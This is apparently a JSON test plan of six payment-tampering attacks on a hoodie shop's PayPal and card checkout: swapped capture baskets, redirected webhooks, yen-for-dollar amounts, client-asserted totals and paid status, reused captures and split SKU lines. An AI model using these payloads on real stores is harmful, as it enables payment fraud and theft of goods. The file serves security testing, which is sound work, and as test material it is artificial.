{
  "plans": [
    {
      "name": "Capture-time basket swap",
      "idea": "The capture endpoint may trust items supplied at capture time instead of the items stored when the $49 PayPal order was approved.",
      "expect": "Five hoodies fulfilled after PayPal captures only the approved $49.",
      "steps": [
        {
          "do": "buy",
          "tamper": {},
          "blockCapture": true,
          "save": "b"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{b.paypalOrderId}}/capture",
          "body": {
            "orderId": "{{b.shopOrderId}}",
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 5
              }
            ],
            "totalCents": 4900,
            "amount": {
              "currency_code": "USD",
              "value": "49.00"
            }
          },
          "headers": {},
          "times": 1,
          "together": false,
          "save": "c"
        }
      ]
    },
    {
      "name": "Cross-order webhook redirect",
      "idea": "The webhook handler may verify that the referenced capture exists at PayPal but fulfill whichever shop order is named by custom_id or invoice_id, without globally preventing reuse of that capture for another order.",
      "expect": "A new unpaid three-hoodie order is marked fulfilled using the legitimate $49 capture belonging to another order.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 3
              }
            ]
          },
          "headers": {},
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "webhook",
          "event": "PAYMENT.CAPTURE.COMPLETED",
          "edit": {
            "resource.custom_id": "{{a.body.orderId}}",
            "resource.invoice_id": "{{a.body.orderId}}",
            "resource.supplementary_data.related_ids.order_id": "{{a.body.id}}"
          },
          "signed": true,
          "times": 1
        }
      ]
    },
    {
      "name": "Yen-for-dollar currency swap",
      "idea": "Order creation may forward a client-supplied currency or purchase unit to PayPal while later checks compare only the numeric value 49, ignoring that it is yen rather than dollars.",
      "expect": "One hoodie fulfilled after paying approximately ¥49 instead of $49.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "currency": "JPY",
            "currency_code": "JPY",
            "amount": {
              "currency_code": "JPY",
              "value": "49.00"
            },
            "purchase_units": [
              {
                "amount": {
                  "currency_code": "JPY",
                  "value": "49.00",
                  "breakdown": {
                    "item_total": {
                      "currency_code": "JPY",
                      "value": "49.00"
                    }
                  }
                },
                "items": [
                  {
                    "name": "Fogline Hoodie",
                    "sku": "FOG-HOODIE",
                    "quantity": "1",
                    "unit_amount": {
                      "currency_code": "JPY",
                      "value": "49.00"
                    }
                  }
                ]
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    },
    {
      "name": "Card checkout says-so total",
      "idea": "The separate card route may trust client-supplied total, paid, status, or capture-reference fields instead of recalculating the basket and verifying its own card charge.",
      "expect": "Three hoodies ordered through card checkout for a stated $1 payment, or without a corresponding card capture.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/checkout/card",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 3
              }
            ],
            "email": "shopper@example.com",
            "card": {
              "number": "4242424242424242",
              "exp": "12/34",
              "cvc": "123"
            },
            "totalCents": 100,
            "total": "1.00",
            "amount": {
              "currency_code": "USD",
              "value": "1.00"
            },
            "paid": true,
            "paymentStatus": "COMPLETED",
            "status": "fulfilled",
            "captureId": "{{legit.captureId}}"
          },
          "headers": {},
          "times": 1,
          "together": false,
          "save": "a"
        }
      ]
    },
    {
      "name": "Legit capture, different order",
      "idea": "The capture endpoint may fulfill an orderId supplied in the capture request body and accept PayPal's already-COMPLETED status, rather than enforcing the stored mapping between that PayPal order, its amount, and its original shop order.",
      "expect": "A separate four-hoodie order is fulfilled by reusing the legitimate $49 PayPal capture.",
      "steps": [
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders",
          "body": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 4
              }
            ]
          },
          "headers": {},
          "times": 1,
          "together": false,
          "save": "a"
        },
        {
          "do": "request",
          "method": "POST",
          "path": "/api/paypal/orders/{{legit.paypalOrderId}}/capture",
          "body": {
            "orderId": "{{a.body.orderId}}",
            "shopOrderId": "{{a.body.orderId}}",
            "paypalOrderId": "{{legit.paypalOrderId}}",
            "captureId": "{{legit.captureId}}",
            "status": "COMPLETED",
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 4
              }
            ]
          },
          "headers": {},
          "times": 1,
          "together": false,
          "save": "c"
        }
      ]
    },
    {
      "name": "Split-line quantity mismatch",
      "idea": "Pricing may deduplicate or normalize repeated and case-variant SKU lines differently from fulfillment, charging for one line while the warehouse sums every stored line.",
      "expect": "Five hoodies fulfilled while PayPal is charged for only one $49 hoodie.",
      "steps": [
        {
          "do": "buy",
          "tamper": {
            "items": [
              {
                "sku": "FOG-HOODIE",
                "qty": 1
              },
              {
                "sku": "FOG-HOODIE",
                "qty": 2
              },
              {
                "sku": "fog-hoodie",
                "qty": 2
              }
            ]
          },
          "blockCapture": false,
          "save": "b"
        }
      ]
    }
  ]
}